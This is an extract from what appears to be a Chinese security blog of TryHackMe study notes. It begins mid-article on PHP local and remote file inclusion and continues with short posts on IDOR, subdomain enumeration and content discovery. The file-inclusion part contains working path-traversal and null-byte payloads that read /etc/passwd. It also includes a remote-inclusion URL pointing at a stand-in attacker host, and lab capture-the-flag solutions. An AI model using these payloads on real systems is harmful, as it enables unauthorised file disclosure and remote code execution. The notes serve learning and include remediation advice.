<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">"lang"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>上面的PHP代码通过URL参数 <code>lang</code> 使用 <code>GET</code>
请求来包含页面的文件。可以发送以下HTTP请求来完成调用：<code>http://webapp.thm/index.php?lang=EN.php</code>加载英文页面或<code>http://webapp.thm/index.php?lang=AR.php</code>加载阿拉伯语页面，其中
<code>EN.php</code> 和 <code>AR.php</code> 文件位于同一目录中。</p>
<p>理论上，如果没有任何输入验证，我们可以通过上面的代码访问并显示服务器上的任何可读文件。假设我们想读取
<code>/etc/passwd</code>
文件，其中包含Linux操作系统用户的敏感信息，我们可以尝试以下操作：<code>http://webapp.thm/get.php?file=/etc/passwd</code></p>
<p>在这种情况下，它之所以有效，是因为 <code>include</code>
函数中没有指定目录，也没有输入验证。</p></li>
<li><p>第二种情况，开发人员指定了函数中的目录。</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP </span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"languages/"</span>. <span class="variable">$_GET</span>[<span class="string">'lang'</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>在上面的代码中，开发人员决定使用<code>include</code>函数通过
<code>lang</code> 参数调用 <code>language</code>
目录中的PHP页面。如果没有输入验证，攻击者可以通过将 <code>lang</code>
输入替换为其他OS敏感文件（如<code>/etc/passwd</code>）来操纵URL。此时，payload
看起来类似于<strong>路径遍历</strong>，但 <code>include</code>
函数允许我们将任何调用的文件包含到当前页面中。以下是漏洞利用：</p>
<p><code>http://webapp.thm/index.php?lang=../../../../etc/passwd</code></p></li>
</ol>
<p>下面介绍的是一些绕过<code>include</code>函数过滤的技巧。</p>
<ol type="1">
<li><p>对于上面两种情况，我们检查了web应用程序的代码，所以我们知道如何利用它。而在本例中，我们将进行黑盒测试（无法得知源代码），在这种情况下，<strong>报错信息</strong>对于理解数据是如何在web应用程序中的传递和处理十分重要。</p>
<p>在这种情况下，假设我们有该切入点：<code>http://webapp.thm/index.php?lang=EN</code>。如果我们输入无效的字段，例如<code>THM</code>，我们将得到如下错误：</p>
<blockquote>
<p>Warning: include(languages/THM.php): failed to open stream: No such
file or directory in /var/www/html/THM-4/index.php on line 12</p>
</blockquote>
<p>该报错信息披露了重要信息，通过将<code>THM</code>作为输入，错误信息显示了<code>include</code>函数的相关内容：<code>include(languages/THM.php);</code>。</p>
<p>仔细查看该目录，我们可以知道该函数包含了<code>languages</code>目录中的文件，并在输入的字符串结尾加上了<code>.php</code>。因此有效输入如下：<code>index.php?lang=EN</code>，其中文件<code>EN</code>在<code>languages</code>目录中，完整文件名为<code>EN.php</code>。此外，报错信息还披露了完整web应用程序目录路径的信息：<code>/var/www/html/THM-4/</code>（即<code>languages</code>目录所在路径）。</p>
<p>我们可以利用<code>http://webapp.thm/index.php?lang=../../../../../etc/passwd</code>来查看敏感信息，我们需要使用
5个 <code>../</code> ，因为我们通过报错信息 已经知道当前路径有四级目录
<code>/var/www/html/THM-4</code>然后再加上之前提到的<code>languages</code>目录，所以一共有需要5个<code>../</code>但是仍然得到错误信息：</p>
<blockquote>
<p>Warning: include(languages/../../../../../etc/passwd.php): failed to
open stream: No such file or directory in /var/www/html/THM-4/index.php
on line 12</p>
</blockquote>
<p>由上面的错误信息可知我们可以访问不同目录中的文件，但是<code>include</code>函数会在文件结尾加上<code>.php</code>，导致无法找到对应的文件。这告诉我们：开发人员指定了传递给<code>include</code>函数的文件类型（php）。为了绕过这种限制，我们可以使用<strong>NULL
BYTE</strong>（即<code>%00</code>）。</p>
<p>使用空字节是一种注入(injection)技术，通过在用户提供的数据添加 URL
编码<code>%00</code>或十六进制的<code>0x00</code>，以终止字符串。你可以将其视为试图欺骗Web应用程序无视空字节后发生的任何事情。</p>
<p>通过在 payload
的结尾添加空字节，告诉<code>include</code>函数忽略空字节之后的内容，如下：</p>
<p><code>include("languages/../../../../../etc/passwd%00").".php");</code>
相当于 <code>include("languages/../../../../../etc/passwd");</code></p>
<p><strong>注意</strong>：<code>%00</code>技巧已修复，不适用于 PHP 5.3.4
及更高版本。</p></li>
<li><p>假设开发者决定过滤关键字以避免泄露敏感信息！正在被过滤的是<code>/etc/passwd</code>文件。此时，有两种可能的方法可以尝试绕过该过滤器：通过使用空字节
<code>%00</code>
或关键字<code>/.</code>。payload可以是<code>http://webapp.thm/index.php?lang=/etc/passwd/.</code>或<code>http://webapp.thm/index.php?lang=/etc/passwd%00</code>。</p>
<p>为了更清楚地理解
<code>/.</code>的使用原理，我们可以查看以下例子：如果我们在文件系统中使用<code>cd ..</code>，我们将切换到上一级目录；如果我们使用的是<code>cd .</code>，我们将停留在当前目录。</p>
<p>因此，当我们输入<code>/etc/passwd/..</code>时，我们将切换目录到<code>/etc/</code>，然后当我们输入<code>/etc/passwd/.</code>时，将停留在当前目录<code>/etc/passwd</code>，因为<code>.</code>指代的就是当前工作目录。</p></li>
<li><p>假设开发人员通过过滤一些关键字来验证用户输入。假设我们输入的
payload
是：<code>http://webapp.thm/index.php?lang=../../../../etc/passwd</code></p>
<p>得到的错误信息如下：</p>
<blockquote>
<p>Warning: include(languages/etc/passwd): failed to open stream: No
such file or directory in /var/www/html/THM-5/index.php on line 15</p>
</blockquote>
<p>由错误信息中的<code>include(languages/etc/passwd)</code>可知web应用程序将<code>../</code>过滤掉了，通过以下方式可以绕过验证：<code>....//....//....//....//....//etc/passwd</code>。</p>
<p>绕过原理：PHP过滤器只匹配并消除它找到的第一个子集字符串<code>../</code>，然后不再过滤，如下图所示：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102094746337.png" alt="image-20230102094746337">
<figcaption aria-hidden="true">image-20230102094746337</figcaption>
</figure></li>
<li><p>假设开发人员强制<code>include</code>函数从指定的目录读取文件。例如，web应用程序要求用户的输入必须包含指定的目录：<code>http://webapp.thm/index.php?lang=languages/EN.php</code>，因此
payload
应该包含指定目录：<code>?lang=languages/../../../../../etc/passwd</code>。</p></li>
</ol>
<h2 id="remote-file-inclusionrfi">Remote File Inclusion（RFI）</h2>
<p>远程文件包含 (RFI)
是一种将远程文件包含到易受攻击的web应用程序中的技术。类似于LFI，当发生不正确的验证时，就会导致RFI，攻击者能够将外部的
URL 注入 <code>include</code> 函数中。<strong>RFI
发生的条件是需要目标服务器启用<code>allow_url_fopen</code>选项，即将该选项设置为<code>on</code>。</strong></p>
<p>RFI 的风险高于 LFI，因为 RFI
漏洞允许攻击者在目标服务器上进行<strong>远程命令执行（RCE）</strong>操作。RFI
导致的其他后果：</p>
<ul>
<li>敏感数据泄露</li>
<li>Cross-site Scripting（XSS）</li>
<li>Denial of Service（DoS）</li>
</ul>
<p>外部服务器必须与目标web应用程序服务器进行通信，以成功实现RFI攻击，攻击者在他们自己的服务器(外部服务器)上托管恶意文件。然后，恶意文件通过HTTP请求注入到目标服务器的<code>include</code>函数中，使得恶意文件的内容在目标应用程序服务器上执行。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102101719466.png" alt="image-20230102101719466">
<figcaption aria-hidden="true">image-20230102101719466</figcaption>
</figure>
<p>如上图所示，攻击者在自己的服务器上托管了一个 PHP
文件：<code>http://attacker.thm/cmd.txt</code>。其中<code>cmd.txt</code>的内容如下：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="keyword">echo</span> <span class="string">"Hello THM"</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>首先，攻击者注入了恶意的URL（指向攻击者服务器）：<code>http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt</code>。如果没有输入验证，那么恶意
URL
会被传递给<code>include</code>函数。接下来，web应用程序服务器会向攻击者服务器发送<code>GET</code>请求以获取目标文件。于是目标Web
应用程序会将远程文件包含到 <code>include</code> 函数中，在页面执行 PHP
文件，并将执行结果返回给攻击者。在该例子中，攻击者会在页面看见<code>Hello THM</code>消息。</p>
<h3 id="实例">实例</h3>
<p>首先介绍如何快速搭建一个http服务，使用 simpleHTTPserver
在几分钟内将您的桌面系统变成本地文件服务器。simpleHTTPserver 是一个
python 模块，可用于设置文件服务器或在 LAN
中即时提供目录。局域网中的任何人都可以立即访问您系统中的文件夹或文件。对于python
3.0及以上版本，运行：</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -m http.server [port]</span><br></pre></td></tr></tbody></table></figure>
<p>下面开始进行实验：</p>
<p>首先在攻击者服务器上新建一个 <code>cmd.txt</code>
文件，内容为：<code>&lt;?PHP echo "Hello THM"; ?&gt;</code>。然后就在当前目录下输入<code>python -m http.server</code>(端口默认为
8000)。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102104507593.png" alt="image-20230102104507593">
<figcaption aria-hidden="true">image-20230102104507593</figcaption>
</figure>
<p>然后在目标网站上输入 payload，实现 RFI 攻击。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102104721781.png" alt="image-20230102104721781">
<figcaption aria-hidden="true">image-20230102104721781</figcaption>
</figure>
<p>同时攻击者服务器会记录目标服务器的请求：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102104911230.png" alt="image-20230102104911230">
<figcaption aria-hidden="true">image-20230102104911230</figcaption>
</figure>
<h2 id="remediation补救措施">Remediation(补救措施)</h2>
<p>作为开发人员，了解 Web
应用程序漏洞、掌握漏洞的发现方法以及预防方法非常重要。
为了防止文件包含漏洞被攻击者利用，一些常见的建议如下：</p>
<ul>
<li>将系统和服务（包括 Web 应用程序框架）更新为最新版本。</li>
<li>关闭 PHP 报错以避免泄露应用程序的路径和其他可能泄露的信息。</li>
<li>Web 应用程序防火墙 (WAF) 是帮助减轻 Web
应用程序攻击的不错选择。</li>
<li>禁用一些会导致文件包含漏洞的 PHP 功能，例如
<code>allow_url_fopen</code> （<code>on</code> 选项）和
<code>allow_url_include</code>。</li>
<li>仔细分析 Web 应用程序，只允许需要的协议和 PHP 包装器。</li>
<li>永远不要相信用户的输入，并确保针对文件包含实施适当的输入验证处理。</li>
<li>对文件名和文件位置实施白名单以及黑名单策略。</li>
</ul>
<h2 id="challenge">Challenge</h2>
<h3 id="flag1">flag1</h3>
<p>打开对应的lab，发现本题需要使用<code>POST</code>传参：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102140838373.png" alt="image-20230102140838373">
<figcaption aria-hidden="true">image-20230102140838373</figcaption>
</figure>
<p>打开 hackbar ，使用post传参得到flag：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141011199.png" alt="image-20230102141011199">
<figcaption aria-hidden="true">image-20230102141011199</figcaption>
</figure>
<h3 id="flag2">flag2</h3>
<p>打开chall2，显示以下页面：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141342252.png" alt="image-20230102141342252">
<figcaption aria-hidden="true">image-20230102141342252</figcaption>
</figure>
<p>根据提示，这题跟<code>cookie</code>有关，F12
打开开发者工具，在<code>存储</code>中找到 cookie</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141551880.png" alt="image-20230102141551880">
<figcaption aria-hidden="true">image-20230102141551880</figcaption>
</figure>
<p>将值改为<code>admin</code>，刷新页面，发现绿色框中会显示对应的文件内容：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141739830.png" alt="image-20230102141739830">
<figcaption aria-hidden="true">image-20230102141739830</figcaption>
</figure>
<p>于是直接将 cookie 的值改为<code>/etc/flag2</code>，得到下图：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141854365.png" alt="image-20230102141854365">
<figcaption aria-hidden="true">image-20230102141854365</figcaption>
</figure>
<p>由上图可知，当前所在路径为<code>includes</code>，并且在文件结尾加上了<code>.php</code>后缀，使用<code>../</code>移动到对应目录，然后用<code>%00</code>截断，所有最终构建的
payload
为：<code>../../../../etc/flag2%00</code>，刷新页面得到flag。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102142239136.png" alt="image-20230102142239136">
<figcaption aria-hidden="true">image-20230102142239136</figcaption>
</figure>
<h3 id="flag3">flag3</h3>
<p>直接在给定的框中输入<code>/etc/flag3</code>，得到错误信息：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102142448439.png" alt="image-20230102142448439">
<figcaption aria-hidden="true">image-20230102142448439</figcaption>
</figure>
<p>由上图发现输入被过滤掉了一些关键字，并且在输入的结尾加上了<code>.php</code>后缀。于是尝试使用<code>POST</code>传参，得到下图：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102142759419.png" alt="image-20230102142759419">
<figcaption aria-hidden="true">image-20230102142759419</figcaption>
</figure>
<p>可知，<code>%00</code>被识别为了字符串，无法进行截断。使用 Burp Suite
进行抓包，得到数据，然后发送到 Repeater 模块</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102143055329.png" alt="image-20230102143055329">
<figcaption aria-hidden="true">image-20230102143055329</figcaption>
</figure>
<p>直接对数据部分进行修改，将<code>file=%2Fetc%2Fflag3%2500</code>修改为<code>file=%2Fetc%2Fflag3%00</code>，即将
URL 编码后的 <code>%2500</code> 修改为原本的 <code>%00</code>
，然后发送数据，得到flag</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102143238925.png" alt="image-20230102143238925">
<figcaption aria-hidden="true">image-20230102143238925</figcaption>
</figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/31/IDOR/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/31/IDOR/" class="post-title-link" itemprop="url">IDOR</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-12-31 00:04:10" itemprop="dateCreated datePublished" datetime="2022-12-31T00:04:10+08:00">2022-12-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-06-10 15:54:04" itemprop="dateModified" datetime="2023-06-10T15:54:04+08:00">2023-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>946</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMe实验房间：https://tryhackme.com/room/idor</p>
<h2 id="what-is-an-idor">What is an IDOR</h2>
<p><strong>IDOR</strong>，Insecure Direct Object
Reference，翻译过来就是<strong>不安全的直接对象引用</strong>，该漏洞是访问控制漏洞(access
control vulnerability)的一种。</p>
<p>当web服务器接收到用户提供的输入来检索对象（文件、数据、文档）时，对用户输入数据的信任度过高，并且在服务端未进行验证，则可能会导致此类漏洞的发生。</p>
<h2 id="an-idor-example">An IDOR Example</h2>
<p>假设你刚注册了一项在线服务，并且想要更改个人信息，点击相关按钮后跳转到<code>http://online-service.thm/profile?user_id=1305</code>，在该页面你能修改个人信息。好奇心驱使你尝试修改<code>user_id</code>的值，令你惊讶的是，你竟然可以看到其他用户的个人信息。这样的漏洞属于IDOR漏洞。</p>
<h2 id="finding-idors-in-encoded-ids">Finding IDORs in Encoded IDs</h2>
<p>在网页之间通过<strong>post data</strong>、<strong>query
strings</strong>或<strong>cookie</strong>等方式传递数据时，开发人员通常会将数据进行编码，编码是为了web服务器能够理解用户传递的数据。常见的编码有<strong>base64</strong>，解码网站为：https://www.base64decode.org。可以通过修改编码内容并重新提交请求以查看是否包含IDOR漏洞。</p>
<h2 id="finding-idors-in-hashed-ids">Finding IDORs in Hashed IDs</h2>
<p>哈希加密后的ID一般比编码后的ID更加复杂，但也是遵循一种可预测的模式。</p>
<p>可以利用https://crackstation.net在线网站查询。</p>
<h2 id="finding-idors-in-unpredictable-ids">Finding IDORs in
Unpredictable IDs</h2>
<p>若是无法在 ID
中找到规律，即不可预测的，可以通过创建两个账户，并且交换它们的 ID
号，来判断是否存在IDOR漏洞。</p>
<h2 id="where-are-idors-located">Where are IDORs located</h2>
<p>攻击点可能不总是在地址栏中，可能在 <strong>AJAX请求</strong>或者
<strong>JavaScript文件</strong>中。例如，你可能会注意到访问<code>/user/details</code>会显示你的用户信息（通过
session
进行身份验证）。但是，通过参数挖掘，你可以发现一个称为<code>user_id</code>的参数，你可以通过修改此参数来显示其他用户的信息，例如
<code>/user/details?user_id = 123</code>。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/27/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/27/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE/" class="post-title-link" itemprop="url">Subdomain Enumeration（子域名枚举）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-12-27 23:40:47" itemprop="dateCreated datePublished" datetime="2022-12-27T23:40:47+08:00">2022-12-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-06-10 15:54:49" itemprop="dateModified" datetime="2023-06-10T15:54:49+08:00">2023-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>719</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMe实验房间：https://tryhackme.com/room/subdomainenumeration</p>
<h2 id="brute-force蛮力法">Brute Force(蛮力法)</h2>
<p>基于字典的枚举找到通用名称子域。<strong>DNSRecon</strong>
是一个功能强大的DNS枚举工具，它的一个功能是使用预定义的字典进行子域枚方法侦查子域。</p>
<h2 id="osint-open-source-intelligence">OSINT (Open-Source
Intelligence)</h2>
<h3 id="ssltls-certificates">SSL/TLS Certificates</h3>
<p>在证书透明度 (CT) 下，证书颁发机构 (CA)
必须在公共日志中发布他们颁发的所有 SSL/TLS 证书，任何人都可以查看 CT
日志并找到为域颁发的证书。</p>
<p>证书透明度 (CT) 日志按设计包含由参与 CA
为任何给定域颁发的所有证书。SSL/TLS
证书一般包含域名、子域名和电子邮件地址。</p>
<p>查找CT
logs：https://crt.sh/，https://ui.ctsearch.entrust.com/ui/ctsearchui</p>
<h3 id="search-engine">Search Engine</h3>
<p>在谷歌中使用<code>-site:www.domain.com site:*.domain.com</code>，该语法可以查找到相关子域名。</p>
<h3 id="sublist3r"><a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></h3>
<p>通过搜集子域名信息，找到目标的关联网站。</p>
<h2 id="virtual-host">Virtual Host</h2>
<p>有些子域并不总是托管在可公开访问的DNS结果中，例如web应用程序的开发版本或管理门户。相反，DNS记录可以保存在私有DNS服务器上，或记录在开发人员的计算机上的/etc/hosts文件（或windows用户的c:）中，DNS记录将域名映射到IP地址上。</p>
<p>web服务器可以在一个服务器上托管多个网站，当客户端请求网站时，服务器可以通过
Host header 得知客户端请求的网站，我们可以通过修改 Host header
以寻找新的域名。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/26/ContentDiscovery/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/26/ContentDiscovery/" class="post-title-link" itemprop="url">Content Discovery（搜集网站信息）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-12-26 23:21:48" itemprop="dateCreated datePublished" datetime="2022-12-26T23:21:48+08:00">2022-12-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-01-04 10:00:08" itemprop="dateModified" datetime="2023-01-04T10:00:08+08:00">2023-01-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Learn the various ways of discovering hidden or private content on a
webserver that could lead to new vulnerabilities.</p>
<p>TryHackMe实验房间： https://tryhackme.com/room/contentdiscovery</p>
<h2 id="manually手动">Manually（手动）</h2>
<h3 id="robots.txt">Robots.txt</h3>
<p>该文件是个文档，它告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取；或者禁止特定的搜索引擎爬取网站。</p>
<p>通常的做法是限制某些网站区域，使其不显示在搜索引擎结果中。这些页面可能是为网站客户提供的管理门户或文件，而<code>robots.txt</code>文件为我们提供了网站上大量（网站拥有者不希望我们访问的）网址。</p>
<h3 id="favicon网页图标">Favicon（网页图标）</h3>
<p>有时，当框架用于构建网站时，作为安装一部分的网页图标会被遗留下来，如果网站开发人员没有用自定义的图标替换它，这可以为我们提供关于框架的线索。OWASP托管一个公共框架图标数据库，您可以使用该数据库对照目标
<strong>favicon</strong>
进行检查（https://wiki.owasp.org/index.php/OWASP_favicon_database），一旦我们了解了框架堆栈，我们就可以使用外部资源来了解更多关于它的信息。</p>
<p>注：上述网站中是使用 md5 哈希值来表示对应的图标。</p>
<h3 id="sitemap.xml">Sitemap.xml</h3>
<p>与限制搜索引擎爬虫的 robots.txt 文件不同，sitemap.xml
文件提供了网站所有者希望在搜索引擎上列出的每个文件的列表。这些有时可能包含网站中难以导航的区域，甚至列出当前网站不再使用但仍在幕后工作的一些旧网页。</p>
<h3 id="http-headers">HTTP Headers</h3>
<p>当客户端向Web服务器发出请求时，服务器会返回各种 HTTP headers，这些
headers 通常包含一些有用的信息，例如 webserver
软件使用的编程/脚本语言，软件版本等。</p>
<p>可以使用<code>curl</code>工具对服务器发起请求。</p>
<h3 id="framework-stack框架">Framework Stack（框架）</h3>
<p>找到网站的框架信息，并通过框架网站找到漏洞。</p>
<h2 id="automated自动">Automated（自动）</h2>
<p><strong>Automated Discovery</strong>
是指使用工具发现内容而不是手动进行的过程。此过程是自动化的，因为它通常包含向Web服务器的数百，数千甚至数百万个请求。这些请求检查网站上是否存在文件或目录，使我们可以访问我们以前不知道的资源。使用称为
<strong>Wordlists</strong> 的资源使此过程成为可能。</p>
<p><strong>Wordlists</strong>
只是包含一长串常用单词的文本文件；它们可以涵盖许多不同的用例。例如，密码表将包含最常用的密码。</p>
<h3 id="ffuf">ffuf</h3>
<p>ffuf 是一款Go语言编写的高速Web
Fuzzer工具，该项目深受大型项目gobuster和wfuzz的启发。使用 wordlists
进行扫描。</p>
<h3 id="dirb">dirb</h3>
<p>基于字典的 web 目录扫描工具。</p>
<h3 id="gobuster">Gobuster</h3>
<p>主要用于网站目录扫描和子域名收集，对目录、文件、DNS和VHost等对象进行暴力破解攻击。</p>
<h2 id="osintopen-source-intelligence">OSINT（Open-Source
Intelligence）</h2>
<h3 id="google-hacking-dorking">Google Hacking / Dorking</h3>
<p>利用Google高级搜索获取信息，例如下面的表格：</p>
<table>
<colgroup>
<col style="width: 11%">
<col style="width: 20%">
<col style="width: 68%">
</colgroup>
<thead>
<tr class="header">
<th><strong>Filter</strong></th>
<th><strong>Example</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>site</td>
<td>site:tryhackme.com</td>
<td>returns results only from the specified website address</td>
</tr>
<tr class="even">
<td>inurl</td>
<td>inurl:admin</td>
<td>returns results that have the specified word in the URL</td>
</tr>
<tr class="odd">
<td>filetype</td>
<td>filetype:pdf</td>
<td>returns results which are a particular file extension</td>
</tr>
<tr class="even">
<td>intitle</td>
<td>intitle:admin</td>
<td>returns results that contain the specified word in the title</td>
</tr>
</tbody>
</table>
<h3 id="wappalyzer">Wappalyzer</h3>
<p>Wappalyzer（https://www.wappalyzer.com/）是一种在线工具，可以帮助识别网站使用的技术，例如框架、内容管理系统（CMS）、支付处理器等，甚至可以找到对应的版本号。</p>
<h3 id="wayback-machine网站时光机">Wayback Machine（网站时光机）</h3>
<p>网站时光机是万维网的数字档案馆，由位于美国加利福尼亚州旧金山的非营利组织互联网档案馆创建，亦为该组织最重要的服务之一。它允许用户“回到过去”，查看过去的网站的样子。通过该网站可以获取网站的一些依旧在使用的旧页面。</p>
<h3 id="github">Github</h3>
<p>可以使用GitHub的搜索功能来查找公司名称或网站名称，以尝试找到属于目标的存储库。一旦发现，或许可以访问尚未找到的源代码，密码或其他内容。</p>
<h3 id="s3-buckets">S3 Buckets</h3>
<p>S3
Buckets是亚马逊AWS提供的一项存储服务，允许人们将文件甚至静态网站内容保存在通过HTTP和HTTPS访问的云中。文件的所有者可以设置访问权限，以使文件公开、私有甚至可写。有时，这些访问权限设置不正确，无意中允许访问公众无法访问的文件。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
